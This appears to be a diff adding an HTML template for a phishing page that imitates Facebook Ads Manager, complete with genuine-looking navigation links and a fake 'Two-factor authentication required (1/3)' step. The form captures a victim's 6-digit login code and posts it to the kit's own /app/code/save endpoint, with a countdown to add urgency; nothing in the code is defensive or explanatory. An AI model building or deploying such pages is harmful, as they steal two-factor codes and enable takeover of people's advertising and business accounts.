@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html xmlns:th="https://thymeleaf.org" lang="en" style="height: 100%;">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
+    integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+
+  <title>Buiness Help Center</title>
+    <link rel="stylesheet" type="text/css" th:href="@{/css/matkhau.css}" />
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/js/bootstrap.bundle.min.js">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
+</head>
+
+<body>
+
+  <body id="body-pd">
+    <header class="header" id="header">
+      <div class="header_toggle"> <i class='bx bx-menu' id="header-toggle"></i> </div>
+
+    </header>
+    <div class="l-navbar" id="nav-bar">
+      <nav class="nav">
+        <div> <a href="https://adsmanager.facebook.com/adsmanager/manage/campaigns?act=440103354166617&nav_entry_point=comet_bookmark&breakdown_regrouping=0" class="nav_logo">
+            <img th:src="@{/images/CnOoIyhtLSO.svg}" style="width: 70px; height: 20px;" />
+            <span class="nav_logo-name">Ads Manager</span> </a>
+          <div class="nav_list"> <a href="https://adsmanager.facebook.com/adsmanager/manage/accounts?act=440103354166617&nav_entry_point=comet_bookmark" class="nav_link active"> <i class='bx bx-grid-alt nav_icon'></i>
+              <span class="nav_name">Account Overiew</span> </a> 
+              <a href="https://adsmanager.facebook.com/adsmanager/reporting/view?act=440103354166617&event_source=AUTO_REDIRECT" class="nav_link"> <i
+                class='bx bx-user nav_icon'></i>
+              <span class="nav_name">Audience</span> </a> 
+              <a href="https://adsmanager.facebook.com/adsmanager/audiences?act=440103354166617&tool=AUDIENCES&nav_entry_point=ads_ecosystem_navigation_menu&nav_source=ads_manager&breakdown_regrouping=0" class="nav_link"> <i
+                class='bx bx-message-square-detail nav_icon'></i> <span class="nav_name">Campaigns</span> </a> 
+              <a href="https://adsmanager.facebook.com/ads/manager/account_settings/?act=440103354166617&nav_entry_point=ads_ecosystem_navigation_menu&nav_source=ads_manager" class="nav_link"> <i class='bx bx-bookmark nav_icon'></i> <span class="nav_name">Ads
+                Reporting</span>
+              </a> 
+              <a href="https://adsmanager.facebook.com/ads/manager/account_settings/information/?act=440103354166617&pid=p1&nav_entry_point=ads_ecosystem_navigation_menu&page=account_settings&tab=account_information" class="nav_link"> <i class='bx bx-folder nav_icon'></i> <span class="nav_name">Ad account
+                settings</span>
+              </a> 
+              <a href="https://business.facebook.com/billing_hub/payment_activity/?asset_id=440103354166617&business_id&placement=ads_manager" class="nav_link"> <i class='bx bx-bar-chart-alt-2 nav_icon'></i> <span
+                class="nav_name">Billing</span> </a> </div>
+
+        </div> <a href="#" class="nav_link"> <i class='bx bx-log-out nav_icon'></i> <span
+            class="nav_name">SignOut</span> </a>
+      </nav>
+    </div>
+    <!--Container Main start-->
+    <div class="height-100 bg-light" style="padding-top: 50px;">
+
+        <form th:action="@{/app/code/save}" th:object="${code}" method="post" class="border " style="border-width: 500px; padding-top: 10px; padding-left: 50px; padding-right: 50px; padding-bottom: 100px;"  >
+               <ul class="list-group">
+                   <li class="list-group-item">
+                       <h6 style=" background: #f5f6f7; padding: 12px; font-weight: 700;">Two-factor authentication required
+                           (1/3)
+                       </h6>
+                   </li>
+                   <li class="list-group-item">You’ve asked us to require a 6-digit login code when anyone tries to access your
+                       account from a new device or browser. <br>
+                       <br>
+                       Enter the 6-digit code from your code generator or third-party app below.
+                   </li>
+                   <li class="list-group-item">
+                       <input type="text" th:field="*{macode}" > <span id="countdownLabel">(5:00)</span>
+                   </li>
+
+                   <input type="hidden" id="hiddenInput" name="hiddenInput" value="" th:field="*{files}">
+
+                   <li class="list-group-item" style="text-align: center;">
+                       <button type="submit"
+                     class="btn btn-primary btn-lg">Send</button>
+                   </li>
+               </ul>
+        </form>
+    </div>
+
+    
+    <!--Container Main end-->
+  </body>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function (event) {
+
+      const showNavbar = (toggleId, navId, bodyId, headerId) => {
+        const toggle = document.getElementById(toggleId),
+          nav = document.getElementById(navId),
+          bodypd = document.getElementById(bodyId),
+          headerpd = document.getElementById(headerId)
+
+        // Validate that all variables exist
+        if (toggle && nav && bodypd && headerpd) {
+          toggle.addEventListener('click', () => {
+            // show navbar
+            nav.classList.toggle('show')
+            // change icon
+            toggle.classList.toggle('bx-x')
+            // add padding to body
+            bodypd.classList.toggle('body-pd')
+            // add padding to header
+            headerpd.classList.toggle('body-pd')
+          })
+        }
+      }
+
+      showNavbar('header-toggle', 'nav-bar', 'body-pd', 'header')
+
+      /*===== LINK ACTIVE =====*/
+      const linkColor = document.querySelectorAll('.nav_link')
+
+      function colorLink() {
+        if (linkColor) {
+          linkColor.forEach(l => l.classList.remove('active'))
+          this.classList.add('active')
+        }
+      }
+      linkColor.forEach(l => l.addEventListener('click', colorLink))
+
+      // Your code to run since DOM is loaded and ready
+    });
+  </script>
+
+.
+  <script >
+      var countdownLabel = document.getElementById('countdownLabel');
+      var countdownTime = 300; // Thời gian đếm ngược ban đầu, 300 giây = 5 phút
+
+      // Cập nhật giá trị đếm ngược sau mỗi giây
+      var countdownInterval = setInterval(function () {
+          var minutes = Math.floor(countdownTime / 60);
+          var seconds = countdownTime % 60;
+
+          // Hiển thị giá trị đếm ngược trên thẻ label
+          countdownLabel.textContent = '(' + minutes + ':' + (seconds < 10 ? '0' : '') + seconds + ')';
+
+          // Giảm thời gian đếm ngược
+          countdownTime--;
+
+          // Kiểm tra nếu thời gian đếm ngược kết thúc
+          if (countdownTime < 0) {
+              clearInterval(countdownInterval); // Dừng đếm ngược
+              countdownLabel.textContent = '(0:00)'; // Hiển thị giá trị cuối cùng
+              // Có thể thực hiện hành động khác tại đây sau khi đếm ngược kết thúc
+          }
+      }, 1000); // Cập nhật sau mỗi giây
+  </script>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
